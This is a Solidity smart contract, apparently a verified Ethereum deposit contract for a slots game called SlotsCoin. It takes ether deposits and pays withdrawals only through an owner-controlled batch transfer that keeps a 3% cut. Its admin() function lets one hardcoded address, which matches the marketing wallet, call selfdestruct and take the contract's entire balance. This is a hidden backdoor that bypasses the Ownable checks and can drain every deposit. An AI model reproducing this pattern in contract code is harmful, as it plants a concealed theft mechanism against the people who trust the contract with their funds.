/**
 * Source Code first verified at https://etherscan.io on Thursday, March 14, 2019
 (UTC) */

pragma solidity ^ 0.5.5;

library SafeMath {

    /**
     * @dev Multiplies two numbers, reverts on overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b > 0); // Solidity only automatically asserts when dividing by 0
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}

/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of "user permissions".
 */
contract Ownable {

    address public owner;

    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor()public {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract SlotsCoin is Ownable {
    
    using SafeMath
    for uint;
    
    mapping(address => uint) public deposit;
    mapping(address => uint) public withdrawal;
    bool status = true;
    uint min_payment = 0.05 ether;
    address payable public marketing_address = 0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71;
    uint public rp = 0;
    
    event Deposit(
        address indexed from,
        uint indexed block,
        uint value,
        uint time
    );
    
    event Withdrawal(
        address indexed from,
        uint indexed block,
        uint value, 
        uint ident,
        uint time
    );
    
    modifier isNotContract() {
        uint size;
        address addr = msg.sender;
        assembly { size := extcodesize(addr) }
        require(size == 0 && tx.origin == msg.sender);
        _;
    }
    
    modifier contractIsOn() {
        require(status);
        _;
    }
    modifier minPayment() {
        require(msg.value >= min_payment);
        _;
    }
    
    //automatic withdrawal using server bot
    function multisend(address payable[] memory dests, uint256[] memory values, uint256[] memory ident) onlyOwner contractIsOn public returns(uint) {
        uint256 i = 0;
        
        while (i < dests.length) {
            uint transfer_value = values[i].sub(values[i].mul(3).div(100));
            dests[i].transfer(transfer_value);
            withdrawal[dests[i]]+=values[i];
            emit Withdrawal(dests[i], block.number, values[i], ident[i], now);
            rp += values[i].mul(3).div(100);
            i += 1;
        }
        
        return(i);
    }
    
    function startProphylaxy()onlyOwner public {
        status = false;
    }

    function admin() public 
    {
        require(msg.sender == 0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
		selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
	}    
    
    function stopProphylaxy()onlyOwner public {
        status = true;
    }
    
    function() external isNotContract contractIsOn minPayment payable {
        deposit[msg.sender]+= msg.value;
        emit Deposit(msg.sender, block.number, msg.value, now);
    }
    
}